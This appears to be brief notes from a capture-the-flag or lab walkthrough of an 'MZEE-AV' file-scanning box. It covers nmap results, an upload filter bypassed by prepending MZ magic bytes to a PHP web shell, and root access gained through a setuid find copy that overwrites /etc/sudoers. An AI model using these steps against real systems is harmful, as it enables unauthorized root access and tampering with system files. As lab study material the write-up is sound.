22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: MZEE-AV - Check your files
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


port 80  . pe files and online av engine. backup files found
<img width="1222" height="456" alt="image" src="https://github.com/user-attachments/assets/cae0a356-81ee-440c-b7f4-36f8a0a64bf3" />
<img width="1053" height="341" alt="image" src="https://github.com/user-attachments/assets/dfcba16c-c702-48e8-842f-74fd4a8671f7" />
<img width="553" height="84" alt="image" src="https://github.com/user-attachments/assets/35b682a7-bc59-4396-a83f-018327eeeeaa" />
files are in /upload/file.tmp  
magic byte thing  
<img width="711" height="431" alt="image" src="https://github.com/user-attachments/assets/054191ad-c0eb-4cd4-a751-baeaf7a0262e" />  
4D5A is the magic bytes which is MZ  
<img width="547" height="190" alt="image" src="https://github.com/user-attachments/assets/746d1fc7-23aa-4e04-88f6-ad12093c5ed0" />

add MZ to the start of the file?  
<img width="1021" height="158" alt="image" src="https://github.com/user-attachments/assets/64bca62a-14ea-42fa-bf79-d60637987806" />
192.168.230.33/upload/shell.php  
<img width="869" height="186" alt="image" src="https://github.com/user-attachments/assets/6da22187-722e-4f60-8a2a-17a401b8ea05" />
<img width="1287" height="248" alt="image" src="https://github.com/user-attachments/assets/a093d78e-ca15-49de-b6b8-849749fa076b" />

/opt/fileS
<img width="525" height="248" alt="image" src="https://github.com/user-attachments/assets/47021e59-094f-4269-98ec-59ac69e0fec2" />
fileS is find  
<img width="459" height="58" alt="image" src="https://github.com/user-attachments/assets/baf72b37-d46c-426c-83bf-97e0da3ac78b" />

edit the sudoers file  
/opt/fileS -fprintf /etc/sudoers 'www-data ALL=(root) NOPASSWD: ALL' -quit

sudo /bin/sh  
<img width="808" height="107" alt="image" src="https://github.com/user-attachments/assets/b6dcb5a5-9169-49b2-9626-adaaa93f3bad" />
